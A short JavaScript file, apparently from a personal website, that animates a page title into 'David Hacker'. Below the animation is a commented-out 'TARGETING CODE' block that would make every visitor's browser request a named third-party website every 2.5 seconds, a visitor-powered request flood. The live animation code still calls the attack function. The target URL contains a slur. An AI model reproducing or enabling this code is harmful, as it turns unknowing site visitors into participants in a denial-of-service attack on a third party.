
// TITLE ANIMATION

var BLINKSPEED = 300,
    TYPESPEED = 200,
    STARTTIMEOUT = 3000,
    MIDTIMEOUT = 900,

    title = document.getElementById("main-title").innerHTML,
    new_title = "David Hacker",
    backspace,
    forwards,
    types = 1,

    blinked = false,
    blinktask = window.setInterval(function() { blink() }, BLINKSPEED);

main()

function main() {
    window.setTimeout(function() {start()}, STARTTIMEOUT);
}

function start() {
    window.clearInterval(blinktask);
    backspace = window.setInterval(function() { startBackspace() }, TYPESPEED);
}


function startBackspace() {
    title = title.substr(0, title.length - 1);
    document.getElementById("main-title").innerHTML = title + "|";
    if (title.length === 0) {
        removeBackspace();
    }
}

function removeBackspace() {
    window.clearInterval(backspace);
    window.setTimeout(function() { forwards = window.setInterval(function() { startTyping() }, TYPESPEED); }, MIDTIMEOUT);
}

function startTyping() {
    title = new_title.substr(0, types++);
    document.getElementById("main-title").innerHTML = title + "|";
    if (title === new_title) {
        endTyping();
    }
}

function endTyping() {
    window.clearInterval(forwards);
    document.getElementById("main-title").innerHTML = title
    issueKillCommand();
}


function blink() {
    if (blinked) {
        document.getElementById("main-title").innerHTML = title + "|";
    }
    else {
        document.getElementById("main-title").innerHTML = title;
    }
    blinked = !blinked;
}

/*
// TARGETING CODE

var evil_button_presser = ['http://www.godhatesfags.com']

function issueKillCommand() {
    setInterval(fetchRandom, 2500)
}

function fetchRandom() {
    fetch(evil_button_presser[randomNumber(0, evil_button_presser.length - 1)])
}

function fetch(url) {
    $.ajax({
        url: url,
        dataType: "text",
        crossDomain: true,
        timeout: 10000,
        cache: true
    })
}

function randomNumber(min, max) {
    return Math.random() * (max - min) + min;
}
*/
